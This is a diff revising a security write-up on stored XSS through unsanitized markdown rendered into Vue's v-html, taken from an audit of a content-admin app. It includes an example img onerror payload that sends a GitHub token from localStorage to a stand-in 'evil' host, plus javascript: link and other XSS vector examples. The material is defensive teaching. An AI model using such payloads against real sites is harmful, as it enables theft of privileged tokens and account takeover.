@@ -17,28 +17,27 @@ updated: 2026-06-11
 ---
 
 Markdown renderers stopped shipping sanitizers years ago. `marked` deprecated its
-`sanitize` option in 2018 and removed it; the docs say plainly that output should be
-treated as untrusted. Yet the mental model "markdown is just text formatting"
-persists, and `v-html="md.parse(content)"` keeps getting written.
+`sanitize` option in 2018 and then removed it, and the docs say plainly that output
+should be treated as untrusted. The mental model "markdown is just text formatting"
+outlives that change, so `v-html="md.parse(content)"` keeps getting written.
 
-On a content-admin SPA (2026-06-11) the audit found exactly that: the editor's
-preview pane piped `marked` output (plus a custom raw-HTML renderer for media tags —
-explicitly passing HTML blocks through) into `v-html`, with no sanitizer anywhere in
-the dependency tree. The threat model that makes this critical and not theoretical:
+A content-admin SPA (2026-06-11) had exactly this. The editor's preview pane piped
+`marked` output into `v-html` with no sanitizer anywhere in the dependency tree, and a
+custom raw-HTML renderer for media tags passed HTML blocks straight through on top of
+that. Two facts turn it from theoretical into critical. First, writers and readers sit
+at different privilege levels: editor-role users write the blog content, while chief
+editors and admins review it in the same preview pane. Second, the session being
+exposed is valuable, since the admin's GitHub token lived in localStorage with `repo`
+and `admin:org` scopes.
 
-- **Writers and readers are different privilege levels.** Editor-role users write
-  blog content. Chief editors and admins *review* it — in the same preview pane.
-- **The session is valuable.** The admin's GitHub token sat in localStorage with
-  `repo` and `admin:org` scopes.
-
-So a low-privilege editor commits a post containing
+A low-privilege editor commits a post containing
 `<img src=x onerror="fetch('https://evil/?t='+localStorage.gh_token)">`, asks for
-review, and harvests an org-admin token. Stored XSS turning the org's own review
-workflow into the attack delivery channel.
+review, and harvests an org-admin token. Stored XSS, with the org's own review workflow
+acting as the delivery channel.
 
 ## How to apply
 
-Sanitize at the injection point — the last function the string passes through before
+Sanitize at the injection point, the last function the string passes through before
 the framework hands it to the DOM:
 
 ```ts
@@ -60,14 +59,14 @@ const html = computed(() =>
 
 Two practical notes from the same fix:
 
-- **DOMPurify's default URI policy blocks `blob:`** — if your preview resolves
+- **DOMPurify's default URI policy blocks `blob:`.** If your preview resolves
   relative asset paths to object URLs, extend the regexp or the images vanish. The
-  default policy passes relative paths and `#anchors` via the non-alpha branch, so
-  footnote links and `./assets/` references survive untouched.
+  default policy still passes relative paths and `#anchors` through the non-alpha
+  branch, so footnote links and `./assets/` references survive untouched.
 - **Custom renderers are part of the surface.** A marked extension with an
-  `html({ text })` hook that returns the text is an explicit raw-HTML pass-through;
-  the sanitizer must run *after* every renderer, which is why the boundary is the
-  injection point and not somewhere inside the pipeline.
+  `html({ text })` hook that returns the text is an explicit raw-HTML pass-through.
+  The sanitizer has to run *after* every renderer, which is the reason the boundary
+  is the injection point rather than somewhere inside the pipeline.
 
 ## Anti-patterns
 
@@ -82,13 +81,13 @@ const safe = stripScriptTags(markdown) // then parse — still XSS
 ```
 
 The second one fails because sanitizing *markdown* is not the same as sanitizing
-*HTML*: `[x](javascript:alert(1))`, reference-style tricks, and renderer extensions
-all materialise after your strip ran.
+*HTML*. Things like `[x](javascript:alert(1))`, reference-style tricks, and renderer
+extensions all materialise after your strip has already run.
 
 ## Enforcement
 
-A unit test per vector class, asserting on the sanitizer's output: `<script>`,
-`onerror=`, `javascript:` hrefs, `<iframe>`, `data:` URLs — plus the positive cases
-your feature needs (blob previews, media tags, footnote anchors), so nobody "fixes"
-a broken preview by deleting the sanitizer. A strict CSP (`script-src 'self'`) is
-the defence-in-depth layer behind it, not a replacement.
+Write a unit test per vector class, asserting on the sanitizer's output: `<script>`,
+`onerror=`, `javascript:` hrefs, `<iframe>`, `data:` URLs. Add the positive cases your
+feature needs too (blob previews, media tags, footnote anchors), so nobody "fixes" a
+broken preview by deleting the sanitizer. A strict CSP (`script-src 'self'`) is the
+defence-in-depth layer behind that, not a replacement for it.
